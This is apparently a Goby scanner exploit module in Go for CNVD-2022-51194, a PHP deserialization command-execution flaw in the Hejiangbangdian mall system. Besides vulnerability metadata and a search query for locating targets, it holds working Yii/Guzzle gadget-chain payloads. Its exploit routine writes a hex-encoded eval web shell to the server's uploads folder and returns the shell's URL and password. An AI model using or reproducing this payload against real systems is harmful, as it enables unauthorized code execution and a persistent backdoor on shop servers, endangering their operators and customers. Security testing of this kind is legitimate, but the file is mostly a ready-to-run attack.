package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strings"
)

func init() {
    expJson := `{
    "Name": "Hejiangbangdian mall system api/testOrderSubmit module exist Command Execution Vulnerability (CNVD-2022-51194)",
    "Description": "<p>Hejiangbangdian mall system is a PHP and MySQL based mall system of Zhejiang Hejiang Information Technology Co., Ltd.</p><p>There is a command execution vulnerability in the preview method under the api/testOrderSubmit module of the Hejiangbangdian mall system. The vulnerability is due to the failure to filter the parameters passed into unserialize.</p>",
    "Product": "Hejiangbangdian mall system",
    "Homepage": "https://www.zjhejiang.com/site/index",
    "DisclosureDate": "2022-07-14",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"const _scriptUrl\"",
    "GobyQuery": "body=\"const _scriptUrl\"",
    "Level": "3",
    "Impact": "<p>There is a command execution vulnerability in the preview method under the api/testOrderSubmit module of the Hejiangbangdian mall system. An attacker can write a Trojan file to the server and directly obtain permissions.</p>",
    "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor sensitive functions</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2022-51194"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "url",
            "type": "input",
            "value": "http://{{{hostinfo}}}",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2022-51194"
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "禾匠榜店商城系统 api/testOrderSubmit 模块存在命令执行漏洞",
            "Product": "榜店商城系统",
            "Description": "<p><span style=\"color: rgb(62, 62, 62);\">禾匠榜店商城系统是<span style=\"color: rgb(62, 62, 62);\">浙江禾匠信息科技有限公司</span>的一套基于PHP和MySQL的商城系统。</span><br></p><p><span style=\"color: rgb(62, 62, 62);\">禾匠榜店商城系统的api/testOrderSubmit模块下的preview方法存在命令执行漏洞</span>，该漏洞源于对传进unserialize的参数未进行过滤</p>",
            "Recommendation": "<p>1、厂商已修复此漏洞，<span style=\"font-size: 17.5px;\"> </span>请用户升级到最新版本</p><p>2、部署web应用防火墙，对敏感函数进行监控</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">禾匠榜店商城系统的api/testOrderSubmit模块下的preview方法存在命令执行漏洞</span>，攻击者可以向服务器写入木马文件，直接获取权限</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Hejiangbangdian mall system api/testOrderSubmit module exist Command Execution Vulnerability (CNVD-2022-51194)",
            "Product": "Hejiangbangdian mall system",
            "Description": "<p>Hejiangbangdian mall system is a PHP and MySQL based mall system of Zhejiang Hejiang Information Technology Co., Ltd.</p><p>There is a command execution vulnerability in the preview method under the api/testOrderSubmit module of the Hejiangbangdian mall system. The vulnerability is due to the failure to filter the parameters passed into unserialize.</p>",
            "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor sensitive functions</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>There is a command execution vulnerability in the preview method under the api/testOrderSubmit module of the Hejiangbangdian mall system. An attacker can write a Trojan file to the server and directly obtain permissions.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            uri := "/web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1"
            cfg := httpclient.NewPostRequestConfig(uri)
            cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
            cfg.VerifyTls = false
            cfg.Data = "form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D"
            if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
                if strings.Contains(resp.RawBody, "phpinfo()") {
                    return true
                } else if strings.Contains(resp.RawBody, "id = ") {
                    for n := 2; n < 200; n++ {
                        uri1 := fmt.Sprintf("/web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=%d", n)
                        cfg1 := httpclient.NewPostRequestConfig(uri1)
                        cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                        cfg1.VerifyTls = false
                        cfg1.Data = "form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D"
                        if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && strings.Contains(resp1.RawBody, "phpinfo()") {
                            return true
                        } else if strings.Contains(resp1.RawBody, "never be unserialized") || strings.Contains(resp1.RawBody, "Version: 4.5") || strings.Contains(resp1.RawBody, "Version: 4.4") || strings.Contains(resp1.RawBody, "Version: 5.1") || strings.Contains(resp1.RawBody, "Version: 5.2") || strings.Contains(resp1.RawBody, "Version: 5.3") {
                            break
                        }
                    }
                }
            }
            return false //无漏洞的返回格式
        },
        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            uri := "/web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1"
            cfg := httpclient.NewPostRequestConfig(uri)
            cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
            cfg.VerifyTls = false
            cfg.Data = "form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D"
            if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
                if strings.Contains(resp.RawBody, "phpinfo()") {
                    write_shell_djwqioejioufqwe(1, expResult)
                } else if strings.Contains(resp.RawBody, "id = ") {
                    for n := 2; n < 200; n++ {
                        uri1 := fmt.Sprintf("/web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=%d", n)
                        cfg1 := httpclient.NewPostRequestConfig(uri1)
                        cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                        cfg1.VerifyTls = false
                        cfg1.Data = "form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D"
                        if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && strings.Contains(resp1.RawBody, "phpinfo()") {
                            write_shell_djwqioejioufqwe(n, expResult)
                            break
                        } else if strings.Contains(resp1.RawBody, "never be unserialized") || strings.Contains(resp1.RawBody, "Version: 4.5") || strings.Contains(resp1.RawBody, "Version: 4.4") || strings.Contains(resp1.RawBody, "Version: 5.1") || strings.Contains(resp1.RawBody, "Version: 5.2") || strings.Contains(resp1.RawBody, "Version: 5.3") {
                            break
                        }
                    }
                }
            }
            url := ss.Params["url"].(string)
            uri2 := "/web/uploads/hejiang_1234.php"
            cfg2 := httpclient.NewPostRequestConfig(uri2)
            cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
            cfg2.VerifyTls = false
            cfg2.Data = "img=echo%20md5(123);"
            if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && strings.Contains(resp2.RawBody, "202cb962ac59075b964b07152d234b70") {
                expResult.Success = true
                expResult.Output = "shell_url: " + url + "/web/uploads/hejiang_1234.php\r\npassword: img"
            } else {
                expResult.Success = true
                expResult.Output = "vul_url: " + url + "/web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1\r\npost_param: form_data(unserialize)"
            }

            return expResult
        },
    ))
}

func write_shell_djwqioejioufqwe(id int, expResult *jsonvul.ExploitResult) {
    uri := fmt.Sprintf("/web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=%d", id)
    cfg := httpclient.NewPostRequestConfig(uri)
    cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
    cfg.VerifyTls = false
    cfg.Data = "form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00method%22%3Ba%3A2%3A%7Bs%3A10%3A%22__toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22yii%5Crest%5CIndexAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22yii%5Cbase%5CView%22%3A0%3A%7B%7Di%3A1%3Bs%3A22%3A%22evaluateDynamicContent%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A132%3A%22file_put_contents%28%27uploads%2Fhejiang_1234.php%27%2Chex2bin%28%273c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e%27%29%29%3Bphpinfo%28%29%3B%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7Ds%3A14%3A%22_fn___toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A6%3Bi%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D"
    if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
    }
}
